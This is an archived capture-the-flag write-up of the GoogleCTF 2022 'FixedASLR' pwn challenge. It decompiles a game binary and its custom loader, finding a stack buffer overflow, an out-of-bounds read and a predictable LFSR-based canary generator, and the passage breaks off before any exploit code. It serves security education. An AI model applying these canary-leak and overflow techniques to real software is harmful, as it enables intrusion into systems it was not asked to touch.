# FixedASLR

**CTF:** GoogleCTF 2022  
**Category:** pwn  
**Original writeup:** <https://chovid99.github.io/posts/google-ctf-2022/> — by **chovid99**. All credit goes to the original author; this is an archived copy.

---

Pwn

Fixed ASLR

I wasn’t happy with the default ASLR, so I fixed it. The flag is in a file called “flag” both in / and cwd.

I worked on this challenge together with my teammate pivik . Thanks a lot pivik !

Initial Analysis

We were given a lot of files, where one of them is the main binary called loader , and the rest are object files.

Now, let’s try to run the program first so that we can know how the program works.

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 ./ loader ______ Welcome to the / ____ / ___ _____ ___ ___ / / __ / __ ` / __ ` __ \ / _ \ / / _ / / / _ / / / / / / / __ / \ ____ / \ __ , _ / _ / / _ / / _ / \ ___ / -=* ) MAIN MENU : 1 ) Play The Game 2 ) See full scoreboard 3 ) See score for place 4 ) Exit Your choice ? 1 Have Fun , Good Luck ! Round 1 How much is 0 + 3 ? 3 Yes ! + 5 pts ! You have 5 pts total . ... [ truncated ] ... Round 11 How much is 3 + 7 ? 10 Yes ! + 5 pts ! You have 55 pts total . Round 12 How much is 2 + 9 ? 0 Wrong ! Game Over ! Congratulations ! You 're going to the SCOREBOARD! How long is your name ( 0 - 31 ) ? 8 Now type in your name : Chovid99 -=* ) MAIN MENU : 1 ) Play The Game 2 ) See full scoreboard 3 ) See score for place 4 ) Exit Your choice ? Come again ? -=* ) MAIN MENU : 1 ) Play The Game 2 ) See full scoreboard 3 ) See score for place 4 ) Exit Your choice ? 2 -=* ) SCOREBOARD : 0. 95 pts --- Gary 1. 90 pts --- Yoel 2. 85 pts --- Nicholas 3. 80 pts --- Vanessa 4. 75 pts --- Alice 5. 70 pts --- Elizabeth 6. 65 pts --- Linda 7. 60 pts --- Peter 8. 55 pts --- Wayne 9. 55 pts --- Chovid99 -=* ) MAIN MENU : 1 ) Play The Game 2 ) See full scoreboard 3 ) See score for place 4 ) Exit Your choice ? 3 Which place 's score do you want to see (0-9)? 0 To get this place you need to beat this score : 95 -=* ) MAIN MENU : 1 ) Play The Game 2 ) See full scoreboard 3 ) See score for place 4 ) Exit Your choice ? 4 Alright , bye WINNER : Gary

Ah okay. Playing around with the binary gave us enough knowledge of how the binary works. We have 4 menus that we can interact:

The first menu will start the math game Each correct answer gave you 5 pts If your score is high enough to be placed on the scoreboard, they will ask your name and then store it on the scoreboard

The second menu will show the full scoreboard

The third menu will show the score value of the scoreboard[input_idx]

The fourth menu will exit the game

Now we’ve got the idea of how the binary works, let’s try analyzing all of the given files. I use Ghidra as my binary analyzer.

Decompilation of game.o

Looking around the given file, turn out that most of the above game methods are defined under game.o file. So, let’s try to analyze the game.o file decompiled results to understand better.

We can start by checking the menu method, which checking the decompiled version is pretty similar to what we have interacted with before.

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 undefined8 menu ( void ) { char cVar1 ; byte bVar2 ; undefined8 uVar3 ; long in_FS_OFFSET ; undefined local_38 [ 40 ]; long local_10 ; local_10 = * ( long * )( in_FS_OFFSET + 0x28 ); puts ( "

-=*) MAIN MENU:

1) Play The Game

2) See full scoreboard

3) See score for place

4) Exit

Your choice?" ); cVar1 = readline ( local_38 , 0x20 ); if ( cVar1 == '\x01' ) { bVar2 = atou64 ( local_38 ); if ( bVar2 == 4 ) { puts ( "Alright, bye" ); uVar3 = 0 ; } else { if ( bVar2 < 5 ) { if ( bVar2 == 3 ) { see_scoreboard (); uVar3 = 1 ; goto LAB_00100829 ; } if ( bVar2 < 4 ) { if ( bVar2 == 1 ) { game (); uVar3 = 1 ; goto LAB_00100829 ; } if ( bVar2 == 2 ) { see_full_scoreboard (); uVar3 = 1 ; goto LAB_00100829 ; } } } puts ( "Come again?" ); uVar3 = 1 ; } } else { uVar3 = 0 ; } LAB_00100829 : if ( local_10 == * ( long * )( in_FS_OFFSET + 0x28 )) { return uVar3 ; } /* WARNING: Subroutine does not return */ __stack_chk_fail (); }

From this menu method, we can see that each menu that we chose before, they have its method to handle the menu.

Let’s try to check the first main menu decompiled result, which is defined under game method.

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 void game ( void ) { char cVar1 ; uint uVar2 ; char cVar3 ; char cVar4 ; long in_FS_OFFSET ; long local_68 ; long local_60 ; char local_58 [ 32 ]; undefined local_38 [ 40 ]; long local_10 ; local_10 = * ( long * )( in_FS_OFFSET + 0x28 ); puts ( "Have Fun, Good Luck!" ); local_68 = 0 ; local_60 = 1 ; do { print ( "

Round " ); u64toa ( local_58 , local_60 ); puts ( local_58 ); uVar2 = rand (); cVar3 = ( char ) uVar2 + ( char )( uVar2 / 10 ) * - 10 ; uVar2 = rand (); cVar4 = ( char )( uVar2 % 10 ); print ( "How much is " ); u64toa ( local_58 , cVar3 ); print ( local_58 ); print ( & DAT_0010099f ); u64toa ( local_58 , cVar4 ); print ( local_58 ); puts ( " ?" ); cVar1 = readline ( local_38 , 0x20 ); if ( cVar1 != '\x01' ) { LAB_00100746 : if ( local_10 != * ( long * )( in_FS_OFFSET + 0x28 )) { /* WARNING: Subroutine does not return */ __stack_chk_fail (); } return ; } cVar1 = atou64 ( local_38 ); if (( char )( cVar4 + cVar3 ) != cVar1 ) { puts ( "Wrong! Game Over!" ); check_scoreboard ( local_68 ); goto LAB_00100746 ; } local_68 = local_68 + 5 ; print ( "Yes! +5pts! You have " ); u64toa ( local_58 , local_68 ); print ( local_58 ); puts ( "pts total." ); local_60 = local_60 + 1 ; } while ( true ); }

Reading through the source code, we can see that it will initialize a loop to give us questions. If we gave the correct answer to the question, it will stay in the loop. It also has a variable to store the points that we get from answering the questions (which is 5 pts per correct answer). If we gave the wrong answer, it will break the loop and call check_scoreboard with the parameter of our total score. Let’s check what the method does.

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 void check_scoreboard ( ulong param_1 ) { long lVar1 ; long in_FS_OFFSET ; int curr_pos ; lVar1 = * ( long * )( in_FS_OFFSET + 0x28 ); curr_pos = 0 ; do { if ( 9 < curr_pos ) { LAB_0010055c : if ( lVar1 != * ( long * )( in_FS_OFFSET + 0x28 )) { /* WARNING: Subroutine does not return */ __stack_chk_fail (); } return ; } if (( ulong ) game_scoreboard [ curr_pos ] < param_1 ) { shift_scoreboard ( curr_pos ); get_player_name ( curr_pos ); game_scoreboard [ curr_pos ] = param_1 ; goto LAB_0010055c ; } curr_pos = curr_pos + 1 ; } while ( true ); }

Reading through the source code, we can see that in this method, if our score is higher than one of the values stored in the game_scoreboard , this method will call shift_scoreboard and get_playername . Let’s try to decompile each of them to understand better.

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 void shift_scoreboard ( int param_1 ) { long lVar1 ; long in_FS_OFFSET ; int curr_pos ; lVar1 = * ( long * )( in_FS_OFFSET + 0x28 ); for ( curr_pos = 9 ; param_1 < curr_pos ; curr_pos = curr_pos + - 1 ) { game_scoreboard [ curr_pos ] = game_scoreboard [( long ) curr_pos + - 1 ]; strcpy ( game_names + ( long ) curr_pos * 0x20 , game_names + ( long ) curr_pos * 0x20 + - 0x20 ); } if ( lVar1 != * ( long * )( in_FS_OFFSET + 0x28 )) { /* WARNING: Subroutine does not return */ __stack_chk_fail (); } return ; }

This method doesn’t have anything suspicious LOC, it just shifts the array to put our score to the scoreboard array.

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 void get_player_name ( int param_1 ) { char cVar1 ; ulong __nbytes ; long in_FS_OFFSET ; undefined local_48 [ 16 ]; char * local_38 ; undefined8 local_30 ; undefined8 local_28 ; ulong local_20 ; long local_10 ; local_10 = * ( long * )( in_FS_OFFSET + 0x28 ); local_38 = ( char * ) 0x0 ; local_30 = 0 ; local_28 = 0 ; local_20 = 0 ; puts ( "Congratulations! You \' re going to the SCOREBOARD!" ); puts ( "How long is your name (0-31)?" ); cVar1 = readline ( local_48 , 0x10 ); if ( cVar1 == '\x01' ) { __nbytes = atou64 ( local_48 ); if ( 0x1f < __nbytes ) { puts ( "Name too long! No SCOREBOARD for you." ); } puts ( "Now type in your name:" ); read ( 0 , & local_38 , __nbytes ); local_20 = local_20 & 0xffffffffffffff ; strcpy ( game_names + ( long ) param_1 * 0x20 ,( char * ) & local_38 ); } if ( local_10 != * ( long * )( in_FS_OFFSET + 0x28 )) { /* WARNING: Subroutine does not return */ __stack_chk_fail (); } return ; }

This method will be used to store our name in the scoreboard, where we will need to send our name as the input, and the scoreboard will be updated. There is something wrong with this method. Let’s see the get_player_name method, especially on the below LOC.

1 2 3 4 5 6 7 8 9 10 11 12 13 puts ( "Congratulations! You \' re going to the SCOREBOARD!" ); puts ( "How long is your name (0-31)?" ); cVar1 = readline ( local_48 , 0x10 ); if ( cVar1 == '\x01' ) { __nbytes = atou64 ( local_48 ); if ( 0x1f < __nbytes ) { puts ( "Name too long! No SCOREBOARD for you." ); } puts ( "Now type in your name:" ); read ( 0 , & local_38 , __nbytes ); local_20 = local_20 & 0xffffffffffffff ; strcpy ( game_names + ( long ) param_1 * 0x20 ,( char * ) & local_38 ); }

The first thing to notice is that these LOCs will:

Ask you the size of your name

Check whether the size is <= 0x1f

Read your name and put it in the local variable in the stack called local_38`` (placed in rbp-0x30`)

But, notice that there is a buffer overflow bug in these LOCs. In case you haven’t known yet, Buffer overflow is a type of security bug where due to an incorrect bound check, the attackers can write more data than it is supposed to be so that they can overwrite adjacent values that aren’t supposed to be able to be overwritten. For example:

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 Let say we have a stack like below , and we have 2 local variables "x" and "y" , where the size of the "x" variable supposed to be 0x10 only Lower Address ---------------------------------- | ........ | <- x variable location in stack |----------------------------------| | ........ | |----------------------------------| | other values | <- y variable location in stack ---------------------------------- Higher Address Due to buffer overflow bug during reading "x" value , we are allowed to write let say input with size 0x18 . Now , due to this bug , "y" variable is got overwritten even though it shouldn 't be overwritten. Below is the stack condition after we send "a" * 0x18 as the input Lower Address ---------------------------------- | aaaaaaaa | <- x variable location in stack |----------------------------------| | aaaaaaaa | |----------------------------------| | aaaaaaaa | <- y variable location in stack and got overwritten ---------------------------------- Higher Address

Back to the LOCs, notice that there is actually a bound check to make sure that the inputted size by the user is less than or equal to 0x1f , so that user isn’t able to write data larger than the defined size.

However, after they print the warning message, the if block logic doesn’t return or stop the method, instead it will goes outside the if block and still continue reading the input, which makes buffer overflow is still possible. This improper bound checking leads to the buffer overflow bug, where we can simply set a large size, and then we can overwrite not only the name variable but also the other values whose address is higher than the name variable.

Now, if we are able to use this buffer overflow bug, we can modify the program flow and get our RCE. Usually, if we have a buffer overflow bug in the stack, our common target is to overwrite the saved return pointer at the bottom of the stack ( rbp+8 ). If you still don’t know how to use BOF to perform RCE, it’s okay. I will try to explain the detail on this later during crafting our exploitation plan.

By overwriting the saved return pointer, we will have full control of the execution flow of the vulnerable binary. In this case, our name variable is placed in rbp-0x30 , so to overwrite the return pointer, we will need to set the input size to at least 0x38 .

However, looking through the code, this binary has already done mitigation from buffer overflow bug by having a canary to prevent stack smashing. Below LOCs is the conditional logic to check the canary value:

1 2 3 4 if ( local_10 != * ( long * )( in_FS_OFFSET + 0x28 )) { /* WARNING: Subroutine does not return */ __stack_chk_fail (); }

In case you didn’t know what that is, canary is a secret value that is placed near the stack return pointer ( rbp-8 ). The purpose of this is to detect whether buffer overflow is performed or not. How to detect it? Well during sending our buffer overflow payload to overwrite the stack return pointer, because canary is placed before the return pointer, that means if we try to overwrite the return pointer of the stack, by default the canary will be overwritten also. And then before jumping to the new return pointer, the binary will check whether the canary in the stack is correct or not (compared to the stored value in fs register), and then return Stack smashing detected if this value is changed from the stack. Below is the example demonstration:

1 2 3 4 5 6 7 8 9 10 11 Round 12 How much is 1 + 2 ? 0 Wrong! Game Over! Congratulations! You're going to the SCOREBOARD! How long is your name (0-31)? 60 Name too long! No SCOREBOARD for you. Now type in your name: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa Stack smashing detected - mischief not managed!

The above example happened due to our example buffer overflow input, where the canary value got replaced with aaaaaaaa . So, how do we usually bypass this? The answer is simple. We need to know the canary value so that we can carefully craft our payload. After that, when we do buffer overflow, we can place the canary value in our payload before our overwritten return pointer, so that when the binary does the canary check, the check will be passed. So, to do this, we need a way to leak the canary .

A common idea to leak it would be to overflow our inputted name until just before the canary (stop at rbp-0x8 ), so that the canary will be included as part of our name on the scoreboard. To give an illustration, consider this LOC in the game method:

1 strcpy ( game_names + ( long ) param_1 * 0x20 ,( char * ) & local_38 );

The above LOC will copy our inputted string to game_names until it found a null terminator \x00 . The idea is to overflow our name and stop just before the canary value so that the null terminator \x00 detected by strcpy will be null after canary value. Example:

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Suppose that the stack layout is like below, where: - 0x7fffffffdb10 = address of our input - 0x7fffffffdb38 = our canary value 0x7fffffffdb10: 0x0000000000000000 0x0000000000000000 0x7fffffffdb20: 0x0000000000000000 0x0000000000000000 0x7fffffffdb30: 0x0000000000000000 0xdfe0586beeff1337 0x7fffffffdb40: 0x0000000000000000 0x0000000000000000 If we overflow our input until 0x7fffffffdb37, the stack will be like below: 0x7fffffffdb10: 0x6161616161616161 0x6161616161616161 0x7fffffffdb20: 0x6161616161616161 0x6161616161616161 0x7fffffffdb30: 0x6161616161616161 0xdfe0586beeff1337 0x7fffffffdb40: 0x0000000000000000 0x0000000000000000 And when the strcpy got called, it will copy our name together with the canary, because the null terminator is found in 0x7fffffffdb40

However, notice that we can’t do this to leak the canary , because this LOC in game method local_20 = local_20 & 0xffffffffffffff; , which is placed just before the strcpy LOC, and it will always set a null terminator ( \x00 ) on 0x20 from our inputted name address before doing the strcpy . So, even though we can overflow the inputted name, the stored name copied to the scoreboard will be only our first 0x1f characters, which implies that the above idea is a pitfall idea. See the illustration below to understand it better:

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 Suppose that the stack layout is like below, where: - 0x7fffffffdb10 = address of our input - 0x7fffffffdb38 = our canary value 0x7fffffffdb10: 0x0000000000000000 0x0000000000000000 0x7fffffffdb20: 0x0000000000000000 0x0000000000000000 0x7fffffffdb30: 0x0000000000000000 0xdfe0586beeff1337 0x7fffffffdb40: 0x0000000000000000 0x0000000000000000 If we overflow our input until 0x7fffffffdb37, because of the LOC "local_20 = local_20 & 0xffffffffffffff;" the stack will be like below: 0x7fffffffdb10: 0x6161616161616161 0x6161616161616161 0x7fffffffdb20: 0x6161616161616161 0x0061616161616161 0x7fffffffdb30: 0x6161616161616161 0xdfe0586beeff1337 0x7fffffffdb40: 0x0000000000000000 0x0000000000000000 And when the strcpy got called, it won't copy our name together with the canary, because the null terminator is found in 0x7fffffffdb2f

So let’s dive further into the code to find a way to leak the canary value. Let’s check another method defined in this object file, especially on the third menu function, which allows us to see the score in the scoreboard[inputted_offset] .

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 void see_scoreboard ( void ) { char cVar1 ; long lVar2 ; long in_FS_OFFSET ; undefined local_58 [ 32 ]; undefined8 local_38 ; undefined8 local_30 ; undefined8 local_28 ; undefined8 local_20 ; long local_10 ; local_10 = * ( long * )( in_FS_OFFSET + 0x28 ); puts ( "Which place \' s score do you want to see (0-9)?" ); cVar1 = readline ( local_58 , 0x20 ); if ( cVar1 == '\x01' ) { lVar2 = atou64 ( local_58 ); print ( "To get this place you need to beat this score: " ); local_38 = 0 ; local_30 = 0 ; local_28 = 0 ; local_20 = 0 ; u64toa ( & local_38 , game_scoreboard [ lVar2 ]); puts (( char * ) & local_38 ); } if ( local_10 != * ( long * )( in_FS_OFFSET + 0x28 )) { /* WARNING: Subroutine does not return */ __stack_chk_fail (); } return ; }

Notice that we found our second bug, where we can do out-of-bounds (OOB) read on the scoreboard array. There isn’t any bound checking when accessing the game_scoreboard array, which means we can leak any value even though it is placed outside the array. So with this bug, hopefully, we can leak useful value later. Keep in mind that our goal is to leak the canary value.

Decompilation of loader

Now we have understood the game.o object file, we still haven’t found a way to leak the canary value, so that we can use the buffer overflow bug. Remember the challenge desc:

I wasn’t happy with the default ASLR, so I fixed it.

Reading through it, it seems like this binary is implementing its own ASLR. In case you didn’t know ASLR, it is a common mitigation technique to make it harder for an attacker to exploit a binary, by setting a random address for the binary function address, stack address, heap, including the used libraries also, so that it will be harder for the attacker to predict the address of each property during crafting their exploit because each new run will have different addresses.

We can deduce that maybe loader file is the one that has the implementation of the custom ASLR as it is the main binary. Let’s check how the loader binary works by decompiling it one by one.

Let’s start by decompiling the _start method, which is the first entry of the loader.

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 void _start ( void ) { undefined8 uVar1 ; int local_14 ; int local_10 ; int local_c ; sys_getrandom ( & rand_state , 8 , 2 ); init_stack_guard (); local_c = 0 ; while ( * ( long * )( files + ( long ) local_c * 8 ) != 0 ) { load_o_phase_1 ( o_ctx + ( long ) local_c * 0x268 , * ( undefined8 * )( files + ( long ) local_c * 8 )); local_c = local_c + 1 ; } local_10 = 0 ; while ( * ( long * )( files + ( long ) local_10 * 8 ) != 0 ) { load_o_phase_2 ( o_ctx + ( long ) local_10 * 0x268 , * ( undefined8 * )( files + ( long ) local_10 * 8 )); local_10 = local_10 + 1 ; } local_14 = 0 ; while ( * ( long * )( files + ( long ) local_14 * 8 ) != 0 ) { load_o_phase_final ( o_ctx + ( long ) local_14 * 0x268 , * ( undefined8 * )( files + ( long ) local_14 * 8 )); local_14 = local_14 + 1 ; } uVar1 = export_get ( & DAT_004031d0 ); zeromem ( o_info , 0x200 ); zeromem ( o_ctx , 0x9a00 ); zeromem ( export_info , 0xa00 ); export_count = 0 ; rand_state = 0 ; pivot_to_main ( uVar1 ); return ; }

After reading through the decompiled codes, seems like this loader will:

Initialize random state

Initialize canary stack value

Load the given object files to the loader

Run the main program

Let’s try to go through it step by step.

Initialize Random State

In this step, the loader will initialize its random state before running the game object file. Let’s check the LOC of this step:

1 sys_getrandom ( & rand_state , 8 , 2 );

So loader will call sys_getrandom . Let’s check it out.

1 2 3 4 5 6 void sys_getrandom ( undefined8 param_1 , undefined8 param_2 , undefined4 param_3 ) { syscall3 ( 0x13e , param_1 , param_2 , param_3 ); return ; }

Oh okay, so turn out, this will call getrandom syscall, and initialize a global variable called rand_state with 8 random bytes.

Initialize canary stack value

Let’s move to the next LOC

1 init_stack_guard ();

Let’s check the method decompiled result.

1 2 3 4 5 6 7 8 9 10 11 12 void init_stack_guard ( void ) { int iVar1 ; undefined8 uVar2 ; uVar2 = sys_mmap ( 0 , 0x1000 , 3 , 0x22 , 0 , 0 ); syscall2 ( 0x9e , 0x1002 , uVar2 ); iVar1 = rand (); write_stack_guard ( iVar1 ); return ; }

1 2 3 4 5 6 7 8 void write_stack_guard ( undefined8 param_1 ) { long in_FS_OFFSET ; * ( undefined8 * )( in_FS_OFFSET + 0x28 ) = param_1 ; return ; }

Basically what this method wants to aim is to generate the canary value from the custom rand() method. Also if you read the assembly, before calling rand() , it set the edi to 0x40 :

Let’s check the rand() method to understand better how it generates the canary value.

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 int rand ( void ) { byte bVar1 ; int in_EDI ; int local_14 ; ulong local_10 ; local_10 = 0 ; for ( local_14 = 0 ; local_14 < in_EDI ; local_14 = local_14 + 1 ) { bVar1 = rand_get_bit (); local_10 = local_10 << 1 | ( ulong ) bVar1 ; } return ( int ) local_10 ; }

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 byte rand_get_bit ( void ) { byte bVar1 ; byte bVar2 ; byte bVar3 ; byte bVar4 ; bVar1 = rand_extract_bit ( 0x3f ); bVar2 = rand_extract_bit ( 0x3d ); bVar3 = rand_extract_bit ( 0x3c ); bVar4 = rand_extract_bit ( 0x3a ); bVar1 = bVar4 ^ bVar1 ^ bVar2 ^ bVar3 ^ 1 ; rand_state = ( ulong ) bVar1 | rand_state * 2 ; return bVar1 ; }

1 2 3 4 5 uint rand_extract_bit ( byte param_1 ) { return ( uint )( rand_state >> ( param_1 & 0x3f )) & 1 ; }

To explain this, basically, the way rand work is:

Set edi before calling rand() . edi will be used as how many bits do the random integer that we want to generate. In this case, it is 64-bit (0x40).

before calling . will be used as how many bits do the random integer that we want to generate. In this case, it is 64-bit (0x40). rand_extract_bit(n) is basically a function that will just take the n-th bit of the rand_state

is basically a function that will just take the n-th bit of the rand_get_bit() is basically will generate a bit which is the result of: rand_extract_bit(63) ^ rand_extract_bit(61) ^ rand_extract_bit(60) ^ rand_extract_bit(58) ^ 1 . And also notice that after generating the random bit, it will remove the MSB of the rand_state by doing a left shift by 1 ( << 1 ), and then put the generated bit as the new LSB.

is basically will generate a bit which is the result of:

The rand method is pretty linear, so keep in mind that we might be able to recover this rand_state if we know enough of the result of rand() values.

Back to the init_stack_guard method, one of the important thing that we can notice from this method is that after calling this rand() , the canary is basically will be set as the latest rand_state , which mean after this call, the next n rand() calls will be based on the canary of the binary as its initial state. This piece of information will be useful later.

Load the given object files to the loader

Now, let’s move to the below LOC

1 2 3 4 5 local_c = 0 ; while ( * ( long * )( files + ( long ) local_c * 8 ) != 0 ) { load_o_phase_1 ( o_ctx + ( long ) local_c * 0x268 , * ( undefined8 * )( files + ( long ) local_c * 8 )); local_c = local_c + 1 ; }

What is files ? Inspecting it via gdb, it is an array consisting of our object filenames. (Notes that the loader binary is No PIE, so the address of global variables such as files and rand_state is consistent, which in this case, files address is 0x4041e0 ).

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 gef➤ x/10gx 0x4041e0 0x4041e0 <files>: 0x0000000000403000 0x0000000000403007 0x4041f0 <files+16>: 0x0000000000403012 0x000000000040301a 0x404200 <files+32>: 0x0000000000403022 0x0000000000403029 0x404210 <files+48>: 0x000000000040302f 0x0000000000000000 0x404220 <o_info>: 0x0000000000000000 0x0000000000000000 gef➤ x/s 0x403000 0x403000: "main.o" gef➤ x/s 0x403007 0x403007: "syscalls.o" gef➤ x/s 0x403012 0x403012: "guard.o" gef➤ x/s 0x40301a 0x40301a: "basic.o" gef➤ x/s 0x403022 0x403022: "game.o" gef➤ x/s 0x403029 0x403029: "res.o" gef➤ x/s 0x40302f 0x40302f: "debug.o"

So, that LOC will iterate an array of object filenames, and then pass it to the load_o_phase_1 method. To understand it better, let’s check the method decompiled result.

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 void load_o_phase_1 ( int * o_ctx , undefined8 param_2 ) { ushort uVar1 ; int iVar2 ; undefined8 uVar3 ; undefined local_f8 [ 48 ]; long local_c8 ; long local_68 ; long local_60 ; long local_58 ; uint * local_50 ; ulong local_48 ; ulong local_40 ; undefined * local_38 ; undefined * local_30 ; ushort local_22 ; long local_20 ; iVar2 = sys_open ( param_2 , 0 , 0 ); * o_ctx = iVar2 ; if ( * o_ctx < 0 ) { die ( "could not open file" ); } sys_fstat ( * o_ctx , local_f8 ); * ( ulong * )( o_ctx + 6 ) = local_c8 + 0xfffU & 0xfffffffffffff000 ; uVar3 = sys_mmap ( 0 , * ( undefined8 * )( o_ctx + 6 ), 1 , 2 ,( long ) * o_ctx , 0 ); * ( undefined8 * )( o_ctx + 2 ) = uVar3 ; * ( undefined8 * )( o_ctx + 4 ) = * ( undefined8 * )( o_ctx + 2 ); uVar3 = aslr_get_addr ( * ( ushort * )( * ( long * )( o_ctx + 4 ) + 0x3c ) + 1 ); * ( undefined8 * )( o_ctx + 0x14 ) = uVar3 ; local_20 = * ( long * )( o_ctx + 0x14 ); uVar3 = mmap_or_die ( local_20 , 0x1000 , 3 ); * ( undefined8 * )( o_ctx + 0x16 ) = uVar3 ; * ( undefined8 * )( o_ctx + 0x18 ) = * ( undefined8 * )( o_ctx + 0x16 ); local_20 = local_20 + 0x1000 ; * ( long * )( o_ctx + 8 ) = * ( long * )( o_ctx + 2 ) + * ( long * )( * ( long * )( o_ctx + 4 ) + 0x28 ); * ( long * )( o_ctx + 10 ) = * ( long * )( o_ctx + 2 ) + * ( long * )(( ulong ) * ( ushort * )( * ( long * )( o_ctx + 4 ) + 0x3e ) * 0x40 + * ( long * )( o_ctx + 8 ) + 0x18 ); local_22 = 0 ; do { if ( * ( ushort * )( * ( long * )( o_ctx + 4 ) + 0x3c ) <= local_22 ) { if ( * ( long * )( o_ctx + 0xe ) == 0 ) { puts ( ".symtab section not found - that \' s somewhat unlikely" ); } if ( * ( long * )( o_ctx + 0xc ) == 0 ) { puts ( ".strtab section not found - that \' s somewhat unlikely" ); } for ( local_48 = * ( ulong * )( o_ctx + 0x10 ); local_48 < * ( ulong * )( o_ctx + 0x12 ) / 0x18 ; local_48 = local_48 + 1 ) { local_50 = ( uint * )( local_48 * 0x18 + * ( long * )( o_ctx + 0xe )); if (( * ( byte * )( local_50 + 1 ) >> 4 != 0 ) && ((( * ( byte * )( local_50 + 1 ) & 0xf ) == 1 || (( * ( byte * )( local_50 + 1 ) & 0xf ) == 2 )))) { local_58 = ( ulong ) * local_50 + * ( long * )( o_ctx + 0xc ); local_60 = * ( long * )( o_ctx + (( long )( int )( uint ) * ( ushort * )(( long ) local_50 + 6 ) + 0xc ) * 2 + 2 ); if ( local_60 == 0 ) { die ( "symbol refers to section that is not loaded" ); } export_add ( local_58 , local_60 + * ( long * )( local_50 + 2 )); } } return ; } local_68 = ( ulong ) local_22 * 0x40 + * ( long * )( o_ctx + 8 ); switch ( * ( undefined4 * )( local_68 + 4 )) { case 0 : case 4 : goto LAB_00401af9 ; case 1 : case 7 : case 8 : break ; case 2 : if ( * ( long * )( o_ctx + 0xe ) == 0 ) { * ( long * )( o_ctx + 0xe ) = * ( long * )( o_ctx + 2 ) + * ( long * )( local_68 + 0x18 ); * ( undefined8 * )( o_ctx + 0x12 ) = * ( undefined8 * )( local_68 + 0x20 ); * ( ulong * )( o_ctx + 0x10 ) = ( ulong ) * ( uint * )( local_68 + 0x2c ); } else { die ( "duplicate symtabs" ); } break ; case 3 : if ( local_22 != * ( ushort * )( * ( long * )( o_ctx + 4 ) + 0x3e )) { if ( * ( long * )( o_ctx + 0xc ) == 0 ) { * ( long * )( o_ctx + 0xc ) = * ( long * )( o_ctx + 2 ) + * ( long * )( local_68 + 0x18 ); } else { die ( "duplicate strtabs" ); } } break ; default : die ( "unknown section type" ); } if (( * ( ulong * )( local_68 + 8 ) & 2 ) != 0 ) { if (( * ( ulong * )( local_68 + 8 ) & 0xf0000000 ) != 0 ) { die ( "SHF_MASKPROC" ); } uVar1 = local_22 ; * ( ulong * )( o_ctx + (( long )( int )( uint ) local_22 + 0x2c ) * 2 + 2 ) = * ( long * )( local_68 + 0x20 ) + 0xfffU & 0xfffffffffffff000 ; if ( * ( long * )( o_ctx + (( long )( int )( uint ) local_22 + 0x2c ) * 2 + 2 ) != 0 ) { uVar3 = mmap_or_die ( local_20 , * ( undefined8 * ) ( o_ctx + (( long )( int )( uint ) local_22 + 0x2c ) * 2 + 2 ), 3 ); * ( undefined8 * )( o_ctx + (( long )( int )( uint ) uVar1 + 0xc ) * 2 + 2 ) = uVar3 ; local_20 = local_20 + * ( long * )( o_ctx + (( long )( int )( uint ) local_22 + 0x2c ) * 2 + 2 ); if ( * ( int * )( local_68 + 4 ) != 8 ) { local_38 = * ( undefined ** )( o_ctx + (( long )( int )( uint ) local_22 + 0xc ) * 2 + 2 ); local_30 = ( undefined * )( * ( long * )( local_68 + 0x18 ) + * ( long * )( o_ctx + 2 )); for ( local_40 = 0 ; local_40 < * ( ulong * )( local_68 + 0x20 ); local_40 = local_40 + 1 ) { * local_38 = * local_30 ; local_38 = local_38 + 1 ; local_30 = local_30 + 1 ; } } } } LAB_00401af9 : local_22 = local_22 + 1 ; } while ( true ); }

Quite long, but basically, it is used to load each object file those were given in the challenge. There are 7 files, so the method load_o_phase_1 will be called 7 times. We just need to go to the important LOC in the load_o_phase_1 method.

1 uVar3 = aslr_get_addr ( * ( ushort * )( * ( long * )( o_ctx + 4 ) + 0x3c ) + 1 );

On each load, the method will call aslr_get_addr . Let’s check this method.

